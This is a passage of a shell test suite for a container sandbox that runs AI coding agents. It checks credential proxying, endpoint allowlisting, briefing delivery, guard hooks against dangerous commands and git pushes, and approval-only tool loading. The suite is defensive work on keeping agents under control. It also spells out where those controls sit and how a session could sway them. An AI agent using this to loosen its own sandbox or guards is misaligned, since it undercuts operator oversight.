    run grep -i 'dotfiles' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
}

@test "bin/dejima dynamically discovers and mounts hook-symlink targets" {
    grep -q 'readlink -f "\$entry"' "$REPO_ROOT/bin/dejima"
    grep -q 'extra_mounts+=(-v "\$real_dir:\$real_dir:ro")' "$REPO_ROOT/bin/dejima"
    grep -q '"\${extra_mounts\[@\]}"' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima layers a writable lazy-lock.json over the read-only nvim config mount" {
    # SANDBOX_NVIM_CONFIG is mounted :ro, but lazy.nvim writes its lockfile
    # back into that same directory on every plugin sync - without this
    # overlay, that write fails with a read-only-filesystem error and the
    # sync aborts (a real bug: plugins never finish installing, so a
    # config's colorscheme fallback kicks in instead of the real one).
    grep -q 'mktemp.*dejima-nvim-lock' "$REPO_ROOT/bin/dejima"
    grep -q 'extra_mounts+=(-v "\$SANDBOX_NVIM_LOCKFILE:\$HOME/\.config/nvim/lazy-lock\.json")' "$REPO_ROOT/bin/dejima"
    grep -q 'rm -f .*"\${SANDBOX_NVIM_LOCKFILE:-}"' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima mounts SANDBOX_EXTRA_MOUNTS entries read-only at their own path" {
    grep -q 'IFS=.:. read -ra extra_paths <<< "\$SANDBOX_EXTRA_MOUNTS"' "$REPO_ROOT/bin/dejima"
    grep -q 'extra_mounts+=(-v "\$path:\$path:ro")' "$REPO_ROOT/bin/dejima"
}

# A HOME with the ~/.claude a harness plugin expects, for exercising
# harness_prepare_config without touching the operator's real one.
_settings_home() {
    local h
    h="$(mktemp -d "$BATS_TEST_TMPDIR/settings-home.XXXXXX")"
    mkdir -p "$h/.claude"
    printf '%s' "$h"
}

@test "the override layer forces sandbox.enabled to false" {
    # Claude Code's own internal per-command sandboxing is redundant on top
    # of this container and can't actually function inside it (bwrap can't
    # create a namespace here) - a session can't be trusted to turn it off
    # itself, so this has to happen on the host, before the container starts.
    #
    # Asserted on what the plugin writes rather than on the line that writes
    # it: the content is the property, and a refactor of how it is produced
    # should not read as this being switched off.
    local overlay
    overlay="$(mktemp)"
    run bash -c '
        source "$1"
        harness_plugin_load claude-code
        HOME="$3" harness_prepare_config "$2"' _ \
        "$REPO_ROOT/bin/dejima-harness-lib.sh" "$overlay" "$(_settings_home)"
    [ "$status" -eq 0 ] || { echo "$output"; rm -f "$overlay"; return 1; }
    run jq -r '.sandbox.enabled' "$overlay"
    rm -f "$overlay"
    [ "$output" = "false" ] || { echo "the overlay does not disable it: $output"; return 1; }
}

@test "the override layer is a delta, not a copy of the operator's settings" {
    # What ships is only what the sandbox overrides; everything else still
    # comes from the operator's real settings.json through Claude Code's own
    # layering. A copy would go stale the moment the host edited the original,
    # and would duplicate every hook it carried across two merged layers.
    local home overlay
    home="$(_settings_home)"
    # A setting nothing in the sandbox overrides, which must not appear.
    printf '{"env":{"OPERATOR_ONLY":"1"},"sandbox":{"enabled":true}}\n' \
        > "$home/.claude/settings.json"
    overlay="$(mktemp)"
    run bash -c '
        source "$1"
        harness_plugin_load claude-code
        HOME="$3" harness_prepare_config "$2"' _ \
        "$REPO_ROOT/bin/dejima-harness-lib.sh" "$overlay" "$home"
    [ "$status" -eq 0 ] || { echo "$output"; rm -f "$overlay"; return 1; }
    run grep -c OPERATOR_ONLY "$overlay"
    rm -f "$overlay"
    [ "$output" = "0" ] || { echo "the operator's settings were copied into the overlay"; return 1; }
}

# --- the Cline plugin ------------------------------------------------------
#
# Every one of these is a property established by running Cline in a container
# and writing down what happened - see docs/development.md, "Worked example:
# Cline". They are pinned here because the next person to read Cline's
# documentation will find it says something else.

# A config directory selecting cline, with whatever [harness.cline] keys the
# test needs. Everything the plugin reads goes through config_get, so this is
# the whole of its input besides the workspace.
_cline_cfg() {
    local d
    d="$(mktemp -d "$BATS_TEST_TMPDIR/cline-cfg.XXXXXX")"
    {
        printf '[core]\nharness = cline\nforge = none\nworkflow = local-only\n'
        printf '[harness.cline]\nstate_dir = %s/state\n' "$d"
        printf '%s\n' "$@"
    } > "$d/config"
    printf '%s' "$d"
}

# $1 is the config dir, $2 the workspace. Prints whatever the plugin said and
# returns its status.
_cline_prepare() {
    DEJIMA_CONFIG_DIR="$1" bash -c '
        source "$2/bin/dejima-provider-lib.sh"
        source "$2/bin/dejima-project-lib.sh"
        source "$2/bin/dejima-harness-lib.sh"
        source "$2/bin/dejima-slug-lib.sh"
        harness_plugin_load cline
        WORKSPACE_DIR="$1"
        harness_prepare_config /dev/null' _ "$2" "$REPO_ROOT"
}

@test "cline refuses to launch with no model configured" {
    # Deliberately no default in the manifest: any model id shipped there goes
    # stale with the next Cline release, and which model an unattended agent
    # runs on is not dejima's call. So the absence has to refuse rather than
    # fall back to whatever Cline would have picked - which is its own hosted
    # endpoint, reached with a credential dejima never saw.
    run _cline_prepare "$(_cline_cfg)" "$BATS_TEST_TMPDIR/ws"
    [ "$status" -ne 0 ] || { echo "launched with no model"; return 1; }
    [[ "$output" == *"no model is configured"* ]] || { echo "$output"; return 1; }
}

@test "a hosted catalogue's model id is configurable, slash and all" {
    # `model` was typed `identifier`, which is [A-Za-z0-9._-]. Every hosted
    # catalogue namespaces by vendor with a slash and several qualify a variant
    # with a colon, so not one OpenRouter id could be set - the backend this
    # harness exists to reach was unusable, and every test here said `model =
    # m`, which is a bare identifier and passes either way.
    #
    # The bracketed one is here because the first fix for that missed it:
    # Anthropic spells a context variant `claude-opus-5[1m]`, and a set built
    # from the ids in the report at hand refused it a release later. Real ids
    # from every catalogue dejima can reach, not the ones that prompted a fix.
    local d ws
    ws="$BATS_TEST_TMPDIR/modelid-ws"; mkdir -p "$ws"
    local id
    for id in z-ai/glm-5.3 deepseek/deepseek-r1:free llama3:8b 'claude-opus-5[1m]' plain-local-model; do
        d="$(_cline_cfg "model = $id" 'backend = self-hosted' \
             '[backend.self-hosted]' 'base_url = http://127.0.0.1:8080/v1')"
        run _cline_prepare "$d" "$ws"
        [ "$status" -eq 0 ] || { echo "refused $id: $output"; return 1; }
        # And it reaches the file cline reads, not just the validator. Found
        # rather than reconstructed: the state directory is keyed by the
        # workspace slug, and spelling that out here would be a second copy of
        # ws_slug that could agree with nothing.
        local written
        written="$(find "$d/state" -name providers.json -print -quit)"
        [ -n "$written" ] || { echo "no providers.json written for $id"; return 1; }
        local wrote
        wrote="$(jq -r '.providers."openai-compatible".settings.model' "$written")"
        [ "$wrote" = "$id" ] \
            || { echo "configured $id, wrote $wrote"; return 1; }
    done
}

@test "a model id that could split a config record is still refused" {
    # The reason the type stays narrow rather than becoming free text: this
    # value is written into a file whose every reader expects one record per
    # line, so a newline or a tab in it splits one.
    local d ws bad
    ws="$BATS_TEST_TMPDIR/modelid-bad-ws"; mkdir -p "$ws"
    for bad in 'has space' 'semi;colon' '/leading-slash'; do
        d="$(_cline_cfg "model = $bad" 'backend = self-hosted' \
             '[backend.self-hosted]' 'base_url = http://127.0.0.1:8080/v1')"
        run _cline_prepare "$d" "$ws"
        [ "$status" -ne 0 ] || { echo "accepted $bad"; return 1; }
        [[ "$output" == *"model"* ]] || { echo "refused $bad without naming it: $output"; return 1; }
    done
}

@test "cline refuses a hosted endpoint whose credential dejima cannot withhold" {
    # R5 is the requirement here, not a network rule. With base_url unset the
    # session reaches Anthropic through dejima's own credential proxy and the
    # key never enters the container; pointed at someone else's hosted API,
    # there is no proxy that could hold a key back, so the key would have to
    # go in. That is the one thing this harness may not do quietly.
    local cfg
    cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = https://api.openai.com/v1")"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
    [ "$status" -ne 0 ] || { echo "accepted a hosted endpoint"; return 1; }
    [[ "$output" == *"refusing [backend.self-hosted] base_url"* ]] || { echo "$output"; return 1; }
}

@test "cline refuses the credential modes it has no path through" {
    # claude-code with the proxy off mounts the operator's real credential -
    # the documented downgrade. cline has no equivalent: the credential it
    # would need is in the providers.json dejima declines to mount, so a
    # placeholder would just produce an auth failure three layers from its
    # cause. Same for the loopback transport, which hands the harness a base
    # URL through the environment that cline does not read.
    local cfg
    for cfg in 'proxy = off' 'transport = loopback'; do
        run _cline_prepare "$(_cline_cfg 'model = m' 'backend = anthropic' '[credentials]' "$cfg")" "$BATS_TEST_TMPDIR/ws"
        [ "$status" -ne 0 ] || { echo "accepted $cfg"; return 1; }
        [[ "$output" == *"no way to reach a proxied"* ]] || { echo "$output"; return 1; }
    done
}

@test "cline with a local endpoint does not care about the credential proxy" {
    # The refusal above is about reaching Anthropic. A model served locally
    # needs no credential at all, so the proxy's state is irrelevant to it -
    # and refusing there would be refusing the configuration that made this
    # harness worth adding.
    local cfg
    cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = http://127.0.0.1:11434/v1" \
        '[credentials]' 'proxy = off')"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "cline accepts a model served on the host or the sandbox network" {
    # The case the whole provider-agnostic argument rests on: an open-weight
    # model served locally needs no credential at all, so there is nothing for
    # R5 to protect and the endpoint is supported today.
    local addr cfg
    for addr in 127.0.0.1 10.1.2.3 192.168.1.5 172.17.0.1 localhost; do
        cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = http://$addr:11434/v1")"
        run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
        [ "$status" -eq 0 ] || { echo "refused $addr: $output"; return 1; }
    done
}

@test "cline accepts an endpoint the operator has allowlisted by name" {
    # A model server on someone's own network normally has a name, not a
    # literal address. Requiring the literal made the local-endpoint path -
    # the reason this harness is provider-agnostic at all - unusable for the
    # ordinary case.
    #
    # The name qualifies because the operator allowlisted it, which is the
    # same store that decides what the container can reach: an endpoint that
    # fails this is one the session could not have connected to anyway.
    local cfg
    cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = https://llm.example.test/v1")"
    printf 'llm.example.test\n' > "$cfg/allowed-domains"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
    [ "$status" -eq 0 ] || { echo "refused an allowlisted endpoint: $output"; return 1; }
}

@test "cline refuses a name the operator has not allowlisted" {
    # The same endpoint without the grant. Nothing about the URL changed;
    # what changed is whether the operator asked for it.
    local cfg
    cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = https://llm.example.test/v1")"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
    [ "$status" -ne 0 ] || { echo "accepted an endpoint nothing granted"; return 1; }
    [[ "$output" == *"refusing [backend.self-hosted] base_url"* ]] || { echo "$output"; return 1; }
}

@test "cline does not mistake a hostname for the private range it starts with" {
    # A glob match on "10." accepts 10.example.com, which resolves wherever
    # its owner says and would take the key with it. The octets are compared
    # as numbers for exactly this.
    local host cfg
    for host in 10.example.com 192.168.example.com 172.16.example.com; do
        cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = http://$host/v1")"
        run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
        [ "$status" -ne 0 ] || { echo "accepted $host as a private address"; return 1; }
    done
}

@test "cline's provider config carries a placeholder, never a real credential" {
    # The same arrangement as Claude Code's faked .credentials.json: what the
    # container holds is a placeholder, and the host-side proxy substitutes the
    # real credential on the way out. Confirmed end to end against the API.
    local cfg ws
    cfg="$(_cline_cfg 'model = claude-haiku-4-5-20251001' 'backend = anthropic')"
    ws="$BATS_TEST_TMPDIR/ws"
    run _cline_prepare "$cfg" "$ws"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    local f
    f="$(find "$cfg/state" -name providers.json | head -1)"
    [ -n "$f" ] || { echo "no providers.json was written"; return 1; }
    run jq -r '.providers.anthropic.settings.apiKey' "$f"
    [[ "$output" == *placeholder* ]] || { echo "the key is not a placeholder: $output"; return 1; }
    # And the endpoint is the real hostname, because the terminator answers
    # for it in-container - not a base-URL override, which would make the
    # session distinguishable from a stock install.
    run jq -r '.providers.anthropic.settings.baseUrl // "unset"' "$f"
    [ "$output" = "unset" ] || { echo "a base URL was written: $output"; return 1; }
}

@test "cline's provider entry carries the timestamp cline requires" {
    # Without updatedAt, Cline discards the entry and falls back to its own
    # hosted endpoint - reporting a provider and model nobody configured, and
    # failing to connect to a host the firewall was never asked to allow.
    #
    # Nothing about the file looks wrong when this is missing, which is why it
    # survived every test that wrote providers.json by hand: those included the
    # field, and the plugin did not. It took a run against a real endpoint.
    local cfg ws f
    cfg="$(_cline_cfg 'model = m' 'backend = anthropic')"
    ws="$BATS_TEST_TMPDIR/ws-ts"
    run _cline_prepare "$cfg" "$ws"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    f="$(find "$cfg/state" -name providers.json | head -1)"
    [ -n "$f" ] || { echo "no providers.json"; return 1; }
    run jq -r '.providers.anthropic.updatedAt // "missing"' "$f"
    [ "$output" != "missing" ] || { echo "no updatedAt: cline will discard this"; return 1; }
    # An ISO-8601 instant, which is the shape Cline writes itself.
    [[ "$output" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{3}Z$ ]] \
        || { echo "not an ISO-8601 instant: $output"; return 1; }
}

@test "cline's local-endpoint provider entry carries it too" {
    # Same field, the other branch. The bug was found on this one.
    local cfg ws f
    cfg="$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = http://127.0.0.1:8080/v1")"
    ws="$BATS_TEST_TMPDIR/ws-ts2"
    run _cline_prepare "$cfg" "$ws"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    f="$(find "$cfg/state" -name providers.json | head -1)"
    run jq -r '.providers."openai-compatible".updatedAt // "missing"' "$f"
    [ "$output" != "missing" ] || { echo "no updatedAt on the local branch"; return 1; }
}

@test "cline gets a context window only when one is configured" {
    # Cline budgets against its own model catalogue. For a model it does not
    # recognise - every self-served one - it has no budget, so it grows the
    # conversation until the SERVER rejects it rather than compacting. Setting
    # this is what makes it compact instead.
    #
    # And absent when unset, deliberately: the right value belongs to the model
    # being served, and dejima guessing one is worse than leaving Cline to its
    # catalogue for a model it does know.
    local cfg f
    cfg="$(_cline_cfg 'model = m' 'backend = anthropic' 'context_window = 15000')"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws-cw"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    f="$(find "$cfg/state" -name providers.json | head -1)"
    run jq -r '.providers.anthropic.settings.contextWindow' "$f"
    [ "$output" = "15000" ] || { echo "not written as a number: $output"; return 1; }

    cfg="$(_cline_cfg 'model = m' 'backend = anthropic')"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws-cw2"
    f="$(find "$cfg/state" -name providers.json | head -1)"
    run jq -r '.providers.anthropic.settings.contextWindow // "absent"' "$f"
    [ "$output" = "absent" ] || { echo "invented a context window: $output"; return 1; }
}

@test "cline's state directory is one per workspace, not one for all of them" {
    # Cline indexes every session it has ever run in a single sessions.db, with
    # the project a session belonged to as a field inside the record rather
    # than a directory above it. So there is no per-project subtree to mount,
    # and the only thing that keeps one project's transcripts out of another's
    # session - #104 - is dejima handing each workspace its own data directory.
    local cfg a b
    cfg="$(_cline_cfg 'model = m' 'backend = anthropic')"
    a="$(DEJIMA_CONFIG_DIR="$cfg" bash -c '
        source "$2/bin/dejima-provider-lib.sh"
        source "$2/bin/dejima-harness-lib.sh"
        source "$2/bin/dejima-slug-lib.sh"
        harness_plugin_load cline
        harness_briefing_state_dir "$1"' _ /tmp/project-one "$REPO_ROOT")"
    b="$(DEJIMA_CONFIG_DIR="$cfg" bash -c '
        source "$2/bin/dejima-provider-lib.sh"
        source "$2/bin/dejima-harness-lib.sh"
        source "$2/bin/dejima-slug-lib.sh"
        harness_plugin_load cline
        harness_briefing_state_dir "$1"' _ /tmp/project-two "$REPO_ROOT")"
    [ -n "$a" ] && [ -n "$b" ] || { echo "no state directory was resolved"; return 1; }
    [ "$a" != "$b" ] || { echo "both projects share $a"; return 1; }
}

# --- delivering the briefing to a harness with no hook ----------------------

@test "every shipped harness delivers the briefing by exactly one route" {
    # Three exist - a session-start hook, a file the harness reads, or a
    # command-line argument - and every harness has to use one. Zero is a
    # session that does not know it is sandboxed, which is what R3 exists to
    # prevent. Two is the same text arriving twice, and one of those copies
    # goes through the hook, which truncates it.
    local name path args hook n
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        path="$(lib manifest_get harness "$name" briefing_path)"
        args="$(lib manifest_get harness "$name" briefing_args)"
        hook=0
        grep -q 'sandbox-context.sh' "$REPO_ROOT/bin/harness/$name.sh" && hook=1
        n=0
        [ -z "$path" ] || n=$((n + 1))
        [ -z "$args" ] || n=$((n + 1))
        # Installing the hook AND taking the briefing by argument is the
        # supported pairing rather than a double delivery: the hook reduces
        # itself to the session id in that case, which the argument route
        # cannot carry.
        [ "$hook" -eq 0 ] || [ -n "$args" ] || n=$((n + 1))
        [ "$n" -eq 1 ] \
            || { echo "$name has $n briefing routes (path='$path' args='$args' hook=$hook)"; return 1; }
    done < <(lib provider_list harness)
}

@test "entrypoint refuses a briefing path that escapes the sandbox home" {
    # Validated as a homepath in the manifest already. Checked again where it
    # becomes a path, because the manifest is data and core is the one that
    # enforces against it.
    grep -q 'refusing harness briefing path' "$REPO_ROOT/docker/entrypoint.sh"
    run bash -c 'grep -A 3 "SANDBOX_HARNESS_BRIEFING_PATH\" in" "$1"' _ "$REPO_ROOT/docker/entrypoint.sh"
    [[ "$output" == *'/*|*..*'* ]] || { echo "no absolute/traversal refusal: $output"; return 1; }
}

@test "the core briefing preamble names no one harness's flags or state" {
    # It used to say --dangerously-skip-permissions and ~/.claude, both of
    # which are Claude Code's and neither of which is true of a second harness.
    # Telling a Cline session about a flag it does not have is not a cosmetic
    # problem: the preamble is where it learns what state it is running in.
    local lib_file="$REPO_ROOT/bin/dejima-provider-lib.sh"
    local preamble
    preamble="$(sed -n '/^_briefing_core_preamble/,/^BRIEFING_EOF$/p' "$lib_file")"
    [[ "$preamble" != *"dangerously-skip-permissions"* ]] \
        || { echo "the preamble names Claude Code's flag"; return 1; }
    [[ "$preamble" != *"~/.claude"* ]] \
        || { echo "the preamble names Claude Code's state directory"; return 1; }
    [[ "$preamble" == *"{{no_confirm_args}}"* ]] \
        || { echo "the preamble no longer says what mode the session is in"; return 1; }
}

# Every command-line tool under bin/, discovered rather than listed. A tool
# added later is covered the day it lands, which is the only version of this
# that stays true - the same reasoning test/shellcheck.sh builds its list on.
#
# Libraries are excluded by name: they are sourced, not run, and have no
# arguments to explain.
_cli_tools() {
    local f name
    for f in "$REPO_ROOT"/bin/*; do
        [ -f "$f" ] && [ -x "$f" ] || continue
        name="$(basename "$f")"
        case "$name" in *-lib.sh) continue ;; esac
        printf '%s\n' "$name"
    done
}

@test "every CLI explains itself with --help" {
    # #64: bare invocation keeps its terse usage line, --help says what the
    # arguments do. On stdout and exit 0, so it can be piped or paged, where
    # usage() stays on stderr and exits nonzero so a mistyped invocation still
    # fails a script.
    local name out
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        run "$REPO_ROOT/bin/$name" --help
        [ "$status" -eq 0 ] || { echo "$name --help exited $status"; return 1; }
        [ -n "$output" ] || { echo "$name --help printed nothing"; return 1; }
        # It has to be about the tool it belongs to, checked on the FIRST
        # line rather than anywhere in the page. A copy-pasted help would
        # still mention the right name incidentally - in a "started by
        # systemd/<name>.service" line, say - so "appears somewhere" is
        # satisfied by a page with the wrong title on it.
        [[ "${lines[0]}" == *"$name"* ]] \
            || { echo "$name --help opens with: ${lines[0]}"; return 1; }
        # And -h reaches the same place - the same output, not merely another
        # exit 0. A tool that ignored -h and happened to succeed would pass a
        # status-only check while printing nothing like help.
        local long="$output" short
        short="$("$REPO_ROOT/bin/$name" -h 2>/dev/null)" \
            || { echo "$name -h failed"; return 1; }
        [ "$short" = "$long" ] \
            || { echo "$name -h and --help disagree"; return 1; }
    done < <(_cli_tools)
}

@test "every option a tool accepts appears in its own --help" {
    # Twice now a flag has been implemented, documented in
    # docs/configuration.md and covered by tests, and left out of the usage
    # block: --harness, then --identity. The help page is the discovery
    # surface, so a flag only the config reference mentions is one most people
    # never find - and neither omission failed anything.
    #
    # Derived from the case arms rather than from a list here, which is what
    # makes it catch the next one without being updated.
    local name flag missing=""
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        local help
        help="$("$REPO_ROOT/bin/$name" --help 2>/dev/null)"
        while IFS= read -r flag; do
            [ -n "$flag" ] || continue
            grep -qF -- "$flag" <<< "$help" || missing="$missing $name:$flag"
        done < <(grep -oE '^\s+(--[a-z][a-z-]*\|)*--[a-z][a-z-]*\)' "$REPO_ROOT/bin/$name" \
            | grep -oE -- '--[a-z][a-z-]*' | sort -u)
    done < <(_cli_tools)
    [ -z "$missing" ] || { echo "accepted but not in --help:$missing"; return 1; }
}

@test "no help page scrolls off a reasonable pane" {
    # The budget is the constraint that forces a help page to choose what
    # matters. Asserted rather than aspired to, so a later addition that pushes
    # one past it fails here instead of quietly growing.
    #
    # bin/dejima gets a larger one, and only bin/dejima. It is the entry point
    # and carries eighteen options where the next tool carries five, so one
    # constant across all of them stops measuring "has this page been allowed
    # to sprawl" and starts measuring "does this tool have the most flags".
    # The exception is a named tool, not a licence: every other page is held
    # to 30, and the way to fit a nineteenth option here is still to earn the
    # line rather than to raise this again.
    local name n budget
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        budget=30
        [ "$name" = dejima ] && budget=36
        n="$("$REPO_ROOT/bin/$name" --help 2>/dev/null | wc -l)"
        [ "$n" -le "$budget" ] || { echo "$name --help is $n lines, budget is $budget"; return 1; }
        # A help page that fits because it says nothing is not the goal either.
        [ "$n" -ge 8 ] || { echo "$name --help is only $n lines"; return 1; }
    done < <(_cli_tools)
}

# The reference is one table per config section, so a row names its key alone
# and the heading above it names the section. Accepts either that or a fully
# qualified `[section] leaf`, which is what the tables covering several
# sections at once (the backends, the forges) still use.
#
# A ROW in both cases, never a prose mention anywhere in the file. Matching
# the key loosely is what let this pass with the key documented only in a
# paragraph three sections away, which is the discoverability problem it
# exists to catch rather than an acceptable answer to it.
_reference_has_key() {  # <doc> <section> <leaf>
    grep -qF "| \`[$2] $3\`" "$1" && return 0
    awk -v sec="[$2]" -v leaf="$3" '
        /^#/ {
            cur = 0
            if (match($0, /\[[a-z.<>-]+\]/) && substr($0, RSTART, RLENGTH) == sec) cur = 1
            next
        }
        cur && index($0, "| `" leaf "`") == 1 { found = 1 }
        END { exit !found }
    ' "$1"
}

@test "every config key the schema knows is in the reference table" {
    # docs/configuration.md's tables are the operator-facing list of what can
    # be set. A key in the schema and not in them is settable and
    # undiscoverable, which is how four of them ended up documented only in
    # docs/security.md, only in docs/remote-access.md, or nowhere.
    local doc="$REPO_ROOT/docs/configuration.md" key section leaf missing=""
    while IFS= read -r key; do
        [ -n "$key" ] || continue
        section="${key%.*}"
        leaf="${key##*.}"
        _reference_has_key "$doc" "$section" "$leaf" \
            || missing="$missing $section.$leaf"
    done < <(sed -n '/^_config_table()/,/^EOF$/p' "$REPO_ROOT/bin/dejima-config-lib.sh" \
        | grep -oE '^[a-z-]+\.[a-z_]+')
    # And the per-provider keys, which live in the manifests rather than the
    # table above.
    local conf axis name spec
    for conf in "$REPO_ROOT"/forges/*/forge.conf "$REPO_ROOT"/harnesses/*/harness.conf; do
        [ -f "$conf" ] || continue
        case "$conf" in */forges/*) axis=forge ;; *) axis=harness ;; esac
        name="$(basename "$(dirname "$conf")")"
        for spec in $(sed -n 's/^keys[[:space:]]*=[[:space:]]*//p' "$conf"); do
            leaf="${spec%%:*}"
            _reference_has_key "$doc" "$axis.$name" "$leaf" \
                || missing="$missing $axis.$name.$leaf"
        done
    done
    [ -z "$missing" ] || { echo "not in the reference table:$missing"; return 1; }
}

@test "an optional tool does not stand between a command and its guard" {
    # The one thing that would make tools a security change rather than a
    # convenience. rtk's own Claude Code integration installs a PreToolUse
    # hook that REWRITES a Bash command - `git push x` becomes `rtk git push
    # x` - in the same slot deny-dangerous-bash.sh, git-push-guard.sh and
    # merge-guard.sh occupy. dejima does not install that hook, and this
    # holds it to that: the tool's manifest may not name one, and nothing
    # here runs the tool's own init.
    local conf="$REPO_ROOT/tools/rtk/tool.conf"
    [ -f "$conf" ] || { echo "the rtk manifest is gone"; return 1; }
    run grep -nE '^(hook|hooks|install_hook|init)' "$conf"
    [ "$status" -ne 0 ] || { echo "rtk declares a hook:"; echo "$output"; return 1; }
    run grep -rn 'rtk init\|rtk hook' "$REPO_ROOT/bin" "$REPO_ROOT/docker" "$REPO_ROOT/hooks"
    [ "$status" -ne 0 ] \
        || { echo "something runs rtk's own installer:"; echo "$output"; return 1; }

    # And the guards are still registered the way they were - a tool layer
    # sits above the harness in the image and changes nothing about them.
    grep -q 'deny-dangerous-bash.sh' "$REPO_ROOT/bin/harness/claude-code.sh" \
        || { echo "the bash guard registration is gone"; return 1; }
    grep -q 'git-push-guard.sh' "$REPO_ROOT/bin/harness/claude-code.sh" \
        || { echo "the push guard registration is gone"; return 1; }
}

@test "the tools doc states the bar rather than describing one tool" {
    # The bar is what makes a second tool safe to add. Written as a rule for
    # every tool, because a document that only describes rtk leaves the next
    # one to be argued from scratch - or not argued at all.
    local doc="$REPO_ROOT/docs/tools.md" claim
    [ -f "$doc" ] || { echo "docs/tools.md is gone"; return 1; }
    grep -qi 'does not mean a bare install' "$doc" \
        || { echo "the doc no longer says what an optional tool is not"; return 1; }
    for claim in 'Pinned and checksummed' 'network behaviour' 'Telemetry off' \
                 'Wired up by dejima' 'guards still hold'; do
        grep -qF "$claim" "$doc" || { echo "the bar drops: $claim"; return 1; }
    done
    # Named as applying to every tool, not to the first one.
    grep -qF 'not only the first' "$doc" \
        || { echo "the bar reads as being about rtk rather than about tools"; return 1; }
}

@test "a tool is never read from the workspace, only from the approval store" {
    # Same rule as every other .dejima/ declaration: the workspace is
    # session-writable, so a session that could add a tool would be choosing
    # what the next session's image contains. The launcher reads approvals.
    grep -q 'approved_entries "$(config_root)" tools' "$REPO_ROOT/bin/dejima" \
        || { echo "the launcher no longer reads approved tools"; return 1; }
    run grep -n 'dejima/tools' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ] \
        || { echo "the launcher reads the declaration directly:"; echo "$output"; return 1; }
}

@test "a flag that turns something off is enforced where the launcher decides" {
    # The override lives in bin/dejima's own memory, and both of these tools
    # re-read the config for themselves - they are run by hand too, where an
    # environment this launcher happened to have would be the wrong authority.
    # So --no-epitaph and --no-conversation are enforced by not starting them,
    # and a resolved config the child never sees is not enforcement.
    local d="$REPO_ROOT/bin/dejima"
    grep -q 'config_get_bool epitaph enabled' "$d" \
        || { echo "the epitaph call is no longer gated on the resolved value"; return 1; }
    grep -q 'config_get_bool logging conversation' "$d" \
        || { echo "the shipper start is no longer gated on the resolved value"; return 1; }

    # The one part --no-log cannot decide for the tool is whether to push what
    # it kept. Honoured from the environment, which is safe only because it
    # can suppress and never enable: a stale export keeps an epitaph off the
    # wire and cannot put one on it.
    grep -q 'DEJIMA_EPITAPH_NO_SHIP' "$d" \
        || { echo "--no-log no longer reaches the epitaph tool"; return 1; }
    grep -q 'DEJIMA_EPITAPH_NO_SHIP' "$REPO_ROOT/bin/dejima-epitaph" \
        || { echo "the epitaph tool no longer honours it"; return 1; }
    # And it gates the push only - the epitaph is still written, because the
    # store is the durable copy and shipping is the bonus on top of it.
    local line
    line="$(grep -n 'DEJIMA_EPITAPH_NO_SHIP' "$REPO_ROOT/bin/dejima-epitaph" | tail -1 | cut -d: -f1)"
    [ "$line" -gt "$(grep -n 'wrote .*epitaph(s) to' "$REPO_ROOT/bin/dejima-epitaph" | cut -d: -f1)" ] \
        || { echo "the no-ship check now runs before the epitaph is written"; return 1; }
}

@test "--help works when there is no config at all" {
    # Which is exactly when someone reaches for it. Every tool dispatches
    # --help before sourcing a library or reading the config, so a missing or
    # malformed config cannot stop it printing.
    local name
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        run env DEJIMA_CONFIG_DIR="$BATS_TEST_TMPDIR/definitely-not-here" \
            "$REPO_ROOT/bin/$name" --help
        [ "$status" -eq 0 ] \
            || { echo "$name --help needs a config to print (exit $status): $output"; return 1; }
    done < <(_cli_tools)
}

@test "bare invocation still prints terse usage, not the help page" {
    # #64 asks for both: the one-line usage stays for a mistyped invocation,
    # and it stays on stderr with a nonzero exit so a script still fails.
    # Checked on the tools that take a required argument.
    local name
    for name in dejima-allow dejima-dep dejima-project dejima-epitaph; do
        run "$REPO_ROOT/bin/$name"
        [ "$status" -ne 0 ] || { echo "$name with no arguments succeeded"; return 1; }
        # Terse: the usage line, not the whole help page.
        [ "${#lines[@]}" -le 4 ] \
            || { echo "$name prints ${#lines[@]} lines bare; usage should stay terse"; return 1; }
    done
}

@test "shellcheck covers the test scripts, which CI runs on a host" {
    # .dejima.md's point, applied to the checker itself: pushing runs this
    # commit on a machine outside the sandbox, so a shell script under test/
    # is code executing there. Leaving them out was not a considered scope -
    # it hid an unguarded cd in the release gate, which would have had it
    # reporting on some other directory's suites.
    local f found=0
    while IFS= read -r f; do
        case "$f" in test/*) found=1 ;; esac
    done < <(bash "$REPO_ROOT/test/shellcheck.sh" --list)
    [ "$found" = 1 ] || { echo "no test/ script is shellchecked"; return 1; }
    # Named, so a rename that drops one from the glob is visible.
    for f in test/shellcheck.sh test/run-confined.sh test/release-pass.sh; do
        [ -f "$REPO_ROOT/$f" ] || continue
